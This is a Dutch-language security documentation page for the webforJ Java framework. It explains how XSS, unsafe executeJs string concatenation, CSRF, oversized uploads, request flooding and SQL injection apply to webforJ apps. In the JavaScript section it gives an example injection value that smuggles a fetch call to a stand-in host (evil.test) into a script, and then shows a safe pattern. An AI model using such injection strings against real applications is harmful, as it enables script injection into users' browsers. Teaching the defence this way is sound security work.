---
sidebar_position: 2
title: Common Threats
description: >-
  How common web threats such as cross-site scripting (XSS), cross-site request
  forgery (CSRF), and SQL injection apply to a webforJ app, what the framework
  handles, and where you stay responsible.
_i18n_hash: f19a2bbb311243417c723fe49ad7d72f
---
Omdat een webforJ-app in Java op de server draait en de browser alleen de interface weergeeft (zie het artikel over de [Client/Server Interactie](/docs/architecture/client-server)), zijn verschillende klassen van aanvallen bij ontwerp ingekapseld. Andere hangen nog steeds af van hoe je je code schrijft. Deze pagina behandelt de bedreigingen die het belangrijkst zijn en trekt een duidelijke lijn tussen wat webforJ afhandelt en wat jouw verantwoordelijkheid is.

## Cross-site scripting (XSS) {#cross-site-scripting-xss}

Een cross-site scripting (XSS) aanval slaagt wanneer een string die bedoeld is om als tekst te worden weergegeven, in plaats daarvan wordt geïnterpreteerd als live markup in de browser. webforJ sluit dit standaard af: wanneer je de tekst van een component instelt, wordt de waarde letterlijk weergegeven, zodat tags erin als karakters verschijnen en nooit worden uitgevoerd.

```java
// Wordt weergegeven als de letterlijke karakters "<b>hi</b>"
component.setText("<b>hi</b>");
```

Het weergeven van echte markup is een aparte, opzettelijke stap. webforJ behandelt een waarde als markup alleen wanneer deze is omgeven door `<html>...</html>`, wat precies is wat de `setHtml`-methode van de `HasHtml`-bezorgdheid voor je doet. Een waarde die op een andere manier is ingesteld, wordt eerst teruggebracht tot platte tekst.

```java
// Opzettelijk als markup weergegeven
component.setHtml("<b>hi</b>");
```

:::danger Markup waarvoor je kiest, wordt niet voor je schoongemaakt
Het framework reinigt de markup die je in `<html>` verpakt niet. Op het moment dat een fragment ervan afkomstig is van een persoon, een opgeslagen record, een querystring of een andere bron die je niet volledig controleert, maak het dan zelf schoon voordat het een component bereikt. Grijp naar een onderhouden schoonmaakhulpmiddel zoals [jsoup](https://jsoup.org/) of de [OWASP Java HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/) en geef het een toegestane lijst van de tags die je daadwerkelijk wilt toestaan.
:::

### JavaScript uitvoeren {#executing-javascript}

Dezelfde regel geldt voor de scripts die je aan de client uitvoert met `executeJs` en de asynchrone varianten daarvan (de <JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink> API). `executeJs` voert de string die je opgeeft uit als een programma, dus alles wat in die string eindigt, is wat de browser uitvoert, inclusief alles wat je inbedde vanuit een onbetrouwbare waarde.

```java
// Gevaarlijk: de waarde is ingebouwd in de programmatekst
el.executeJs("greet('" + name + "')");
```

Als `name` `'); fetch('https://evil.test'); ('` bevat, voert de browser in plaats daarvan het volgende programma uit:

```js
greet(''); fetch('https://evil.test'); ('')
```

De `fetch` van de aanvaller is nu een statement in jouw programma, dus het wordt uitgevoerd. Concatenatie is wat de invoer *deel van de code* maakte.

Houd onbetrouwbare waarden helemaal uit het script. Stuur de waarde naar de client als data, stel deze in op het element en voer vervolgens een vast script uit dat het terugleest via het `component`-sleutelwoord:

```java
// Veilig: de waarde is data die het script leest, nooit code
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

Hier is het programma dat de browser uitvoert altijd gewoon `greet(component.greetName)`. Er is geen onbetrouwbare invoer om te parseren. De waarde bevindt zich in een eigenschap, en het lezen van een stringwaarde voert deze nooit uit, zodat dezelfde `name` als tekst aan `greet` wordt doorgegeven in plaats van als code te worden uitgevoerd.

## Cross-site request forgery (CSRF) {#cross-site-request-forgery-csrf}

Een cross-site request forgery (CSRF) aanval misleidt de browser van een ingelogde gebruiker om een actie te verzenden die de gebruiker nooit bedoelde. webforJ blokkeert dit voor zijn eigen verkeer zonder enige configuratie: het framework vertrouwt alleen verzoeken die behoren tot de huidige sessie van de gebruiker, zodat een pagina op een andere oorsprong de app van de gebruiker niet kan aansteken.

Dit wordt zichtbaar in precies één situatie. [Spring Security](/docs/security/getting-started) activeert zijn eigen bescherming tegen gefalsificeerde verzoeken voor elk verzoek, en heeft geen kennis van de kanaal van webforJ, dus het zou het verkeer van het framework afwijzen en de app zou niet laden. De integratie van webforJ met Spring regelt dit voor jou: <JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> vertelt Spring om zijn verificatie over te slaan voor de verzoeken van het webforJ-framework. Dat is veilig omdat het framework die verzoeken zelf al beschermt, zodat er niets onbeschermd blijft.

:::info Hand-rolled Spring-configuratie
Als je een `SecurityFilterChain` samenstelt zonder de `webforj()` helper, sluit dan zelf de verzoeken van het framework uit van de verificatie van Spring en houd die verificatie ingeschakeld voor endpoint's die je toevoegt.
:::

## Onbeperkte bestand uploads {#unbounded-file-uploads}

Bestanden van elke grootte of hoeveelheid accepteren nodigt uit tot een denial of service door uitgeputte geheugen-, schijf- of bandbreedtebronnen. Beperk wat je accepteert op de uploadcomponenten: ze bieden `setMaxFileSize()` om elk bestand te beperken en `setMaxFiles()` om te beperken hoeveel er tegelijkertijd binnenkomen.

Behandel dat als de eerste lijn in plaats van de enige. Een browserzijde limiet kan worden omzeild, dus handhaaf ook een plafond op de server: stel `webforj.fileUpload.maxSize` in je [configuratie](/docs/configuration/properties) in om te grote uploads te weigeren voordat ze je code bereiken, en begrens de maximale aanvraaggrootte in je servletcontainer of omgekeerde proxy.

## Verzoeken overspoelen {#request-flooding}

Een gemanipuleerde client kan ook proberen de server direct te overweldigen: het verzenden van een enkele zeer grote aanvraag, of het snel starten van nieuwe app-sessies totdat geheugen of andere bronnen opraken. Omdat de server elke app aanstuurt, bereikt een vloed van elke soort deze rechtstreeks.

webforJ kan beide begrenzen. Stel `webforj.security.maxContentLength` in om, in bytes, de grootte van een verzoek dat de app accepteert te beperken en `webforj.security.maxInitPerMinute` om te beperken hoeveel nieuwe app-sessies per minuut starten. Beide zijn standaard ingesteld op `0`, wat ze uitschakelt, dus stel ze in voor elke implementatie die openstaat voor onbetrouwbaar verkeer. Zie [Eigenschap configuratie](/docs/configuration/properties) voor details.

Net als bij uploads, beschouw deze als de binnenste laag en beperk ook de aanvraaggrootte in je servletcontainer of omgekeerde proxy.

## SQL-injectie {#sql-injection}

webforJ bevindt zich nergens in de datalaag, zodat de weerstand tegen SQL-injectie volledig op je querycode rust. Gebruik geparametriseerde queries of voorbereide instructies zodat waarden als parameters worden gebonden in plaats van in de instructie te worden samengevoegd, en bouw nooit een query door strings met gebruikersinvoer te combineren. Dit is normale JDBC- en persistentielaagpraktijk, en het geldt ongewijzigd in een webforJ-app.
